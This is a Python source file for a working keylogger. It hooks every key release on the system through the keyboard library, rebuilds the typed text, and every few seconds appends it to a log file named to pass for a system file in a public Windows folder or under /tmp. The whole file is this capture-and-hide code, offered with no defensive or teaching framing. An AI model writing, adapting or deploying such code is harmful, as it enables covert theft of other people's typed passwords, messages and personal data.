import keyboard
from platform import system
from threading import Timer
from datetime import datetime

#   Every 6 hrs 21600
REPORT_TIMING = 5
WIN_DIR = r"C:\Users\Public\Roaming\system_log78563"
LIN_DIR = r"/tmp/sytem_log78563"

class KeyLogger:
    def __init__(self, interval=REPORT_TIMING, log_dir=WIN_DIR):
        self.interval = interval
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        self.log_dir = log_dir

    def log_key(self, event):
        """
        Method is used in order to handle key presses. Also handles the
        behavior of special characters
        """
        
        name = event.name
        if name == "space":
            self.log += " "
        elif name == "enter":
            self.log += "\n"
        elif name == "backspace":
            self.log = self.log[:-1]
        elif name == "decimal":
            self.log += "."
        elif name == "tab":
            self.log += ""
        elif name == "left":
            pass
        elif name == "right":
            pass
        elif name == "up":
            pass
        elif name == "down":
            pass
        elif name == "shift":
            pass
        elif name == "ctrl":
            pass
        else:
            self.log += name.replace(" ", "_")

    def report(self):
        """
        This function is called every interval to write the logger results to
        the log file
        """
        self.end_dt = datetime.now()
        if self.log:
            with open(f"{self.log_dir}.log", "a") as f:
                print(f"\n\nLog Reporting period: {self.start_dt} - {self.end_dt}\n{self.log}", file=f)
 
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        """
        Determine which kind of filepath to use
        """
        if (system() == "Windows"):
            self.log_dir = WIN_DIR
        else:
            self.log_dir = LIN_DIR
        
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.log_key)
        self.report()
        keyboard.wait()

if __name__ == "__main__":
    keylogger = KeyLogger()
    keylogger.start()
